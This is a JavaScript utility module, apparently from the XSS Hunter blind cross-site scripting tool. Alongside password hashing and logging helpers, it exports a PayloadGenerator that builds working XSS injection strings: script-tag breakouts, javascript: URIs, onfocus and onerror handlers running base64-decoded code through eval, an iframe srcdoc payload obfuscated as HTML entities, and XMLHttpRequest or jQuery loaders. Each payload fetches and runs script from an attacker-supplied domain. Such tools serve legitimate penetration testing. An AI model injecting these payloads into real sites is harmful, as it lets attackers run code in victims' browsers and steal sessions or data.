const crypto = require('crypto');
const bcrypt = require('bcrypt');
const moment = require('moment');

function copy(input_data) {
  return JSON.parse(JSON.stringify(input_data));
}

function get_secure_random_string(bytes_length) {
  const validChars = 'abcdefghijklmnopqrstuvwxyz0123456789';
  let array = crypto.randomBytes(bytes_length);
  array = array.map((x) => validChars.charCodeAt(x % validChars.length));
  const random_string = String.fromCharCode.apply(null, array);
  return random_string;
}

async function get_hashed_password(password) {
  // If no environment variable is set, default
  // to doing 10 rounds.
  const bcrypt_rounds = process.env.XSSHUNTER_BCRYPT_ROUNDS
    ? parseInt(process.env.XSSHUNTER_BCRYPT_ROUNDS)
    : 10;

  return bcrypt.hash(password, bcrypt_rounds);
}

function logit(input_string) {
  const datetime = moment().format('MMMM Do YYYY, h:mm:ss a');
  // Add spacer unless it starts with a `[`
  const spacer = input_string.startsWith('[') ? '' : ' ';
  console.log(`[${datetime}]${spacer}${input_string.trim()}`);
}

function html_encode(value) {
  return String(value)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/=/g, '&#61;')
    .replace(/ /g, '&#32;');
}

function urlsafe_base64_encode(value) {
  return btoa(value).replace(/\=/g, '');
}

const isUseHttps = false;
const requestHeading = isUseHttps ? 'https' : 'http';
const PayloadGenerator = {
  js_attrib(base_domain) {
    return (
      'var a=document.createElement("script");a.src="' +
      requestHeading +
      '://' +
      base_domain +
      '";document.body.appendChild(a);'
    );
  },
  basic_script(base_domain) {
    return (
      '"><script src="' + requestHeading + '://' + base_domain + '"></script>'
    );
  },
  javascript_uri(base_domain) {
    return (
      "javascript:eval('var a=document.createElement(\\'script\\');a.src=\\''+ requestHeading+'://" +
      base_domain +
      "\\';document.body.appendChild(a)')"
    );
  },
  input_onfocus(js_attrib) {
    return (
      '"><input onfocus=eval(atob(this.id)) id=' +
      html_encode(urlsafe_base64_encode(js_attrib)) +
      ' autofocus>'
    );
  },
  image_onerror(js_attrib) {
    return (
      '"><img src=x id=' +
      html_encode(urlsafe_base64_encode(js_attrib)) +
      ' onerror=eval(atob(this.id))>'
    );
  },
  video_source(js_attrib) {
    return (
      '"><video><source onerror=eval(atob(this.id)) id=' +
      html_encode(urlsafe_base64_encode(js_attrib)) +
      '>'
    );
  },
  iframe_srcdoc(base_domain) {
    return (
      '"><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;' +
      base_domain +
      '&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;"'
    );
  },
  xmlhttprequest_load(base_domain) {
    return (
      '<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "' +
      requestHeading +
      '://' +
      base_domain +
      '");a.send();</script>'
    );
  },
  jquery_chainload(base_domain) {
    return (
      '<script>$.getScript("' +
      requestHeading +
      '://' +
      base_domain +
      '")</script>'
    );
  },
};
module.exports = {
  copy: copy,
  get_secure_random_string: get_secure_random_string,
  get_hashed_password: get_hashed_password,
  logit: logit,
  PayloadGenerator: PayloadGenerator,
};
